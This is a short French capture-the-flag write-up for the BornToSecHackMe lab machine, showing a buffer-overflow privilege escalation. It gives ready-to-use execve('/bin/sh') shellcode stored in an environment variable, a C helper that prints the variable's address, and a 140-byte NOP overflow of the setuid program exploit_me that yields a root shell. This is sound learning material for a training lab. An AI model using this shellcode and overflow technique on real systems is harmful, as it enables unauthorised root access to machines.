# Writeup4


L'objectif est d'executer un shellcode permettant d'ouvrir un terminal avec les privileges root.

```bash
zaz@BornToSecHackMe:~$ export OPEN_TERMINAL=$'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'
zaz@BornToSecHackMe:~$ vim script.c

```

On fait un petit script pour .

```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv)
{
	if (argc == 2)
	{
		char* ptr = getenv(argv[1]);
		printf("%p\n", ptr);
	}
 return (0);
}
```

Puis on execute le tout avec un buffer overflow.

```bash
zaz@BornToSecHackMe:~$ gcc
.bash_history  .bashrc        exploit_me     .profile       .viminfo
.bash_logout   .cache/        mail/          script.c
zaz@BornToSecHackMe:~$ gcc
.bash_history  .bashrc        exploit_me     .profile       .viminfo
.bash_logout   .cache/        mail/          script.c
zaz@BornToSecHackMe:~$ gcc script.c
zaz@BornToSecHackMe:~$ ./a.out OPEN_TERMINAL
0xbffffe60
```
0xbffffe60 -> "\x60\xfe\xff\xbf"

``` bash
zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print "\x90" * 140 + "\x60\xfe\xff\xbf"')
��������������������������������������������������������������������������������������������������������������������������������������������`���
# id
uid=0(root) gid=0(root) groups=0(root),1005(zaz)
# whoami
root
```

Nous voila root
